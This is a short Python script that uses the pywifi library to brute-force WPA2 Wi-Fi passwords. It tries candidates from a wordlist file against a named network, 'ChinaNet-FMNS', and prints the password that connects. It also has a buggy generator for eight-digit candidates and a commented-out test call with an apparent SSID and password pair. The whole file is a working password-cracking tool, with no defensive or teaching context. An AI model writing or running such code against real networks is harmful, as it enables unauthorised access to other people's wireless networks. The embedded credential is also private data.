from pywifi import PyWiFi,const,Profile
import time
def test1  (wifi_name,wifi_password):
    wifi=PyWiFi()
    iface=wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)
    info=Profile()
    info.ssid=wifi_name
    info.auth=const.AUTH_ALG_OPEN
    info.akm.append(const.AKM_TYPE_WPA2PSK)
    info.cipher=const.CIPHER_TYPE_CCMP
    info.key=wifi_password
    iface.remove_all_network_profiles()
    tmp=iface.add_network_profile(info)
    iface.connect(tmp)
    time.sleep(3)

    if iface.status()==const.IFACE_CONNECTED:
        print('成功')
        print(wifi_password)

    else:
        print('失败')
def pass1():
    list1=[]
    for i in range(1,9):
        for a in range(1,9):
            for b in range(1,9):
                for c in range(1,9):
                    for d in range(1,9):
                        for e in range(1,9):
                            for f in range(1,9):
                                for h in range(1,9):
                                    ps=(str(i),str(a),str(b),str(c),str(d),str(e),str(f),str(h))
                                    list1.append(ps)
                                    # print(ps)
                                    # c=list(map(str,(ps)))
                                    a=(" ".join(ps))
                                    print(a)

def pass2():
    with open("D:/2.txt", "r") as f :
        for wifi_password in f :
            wifi = PyWiFi()
            iface = wifi.interfaces()[0]
            iface.disconnect()
            time.sleep(1)
            info = Profile()
            info.ssid = 'ChinaNet-FMNS'
            info.auth = const.AUTH_ALG_OPEN
            info.akm.append(const.AKM_TYPE_WPA2PSK)
            info.cipher = const.CIPHER_TYPE_CCMP
            info.key = wifi_password
            iface.remove_all_network_profiles()
            tmp = iface.add_network_profile(info)
            iface.connect(tmp)
            time.sleep(3)

            if iface.status() == const.IFACE_CONNECTED:
                print('成功')
                print(wifi_password)

                break

            else:
                print('失败')
                print(wifi_password)



if __name__ == '__main__':
    # test1('iPhone 6s','hh0123456789')
    pass2()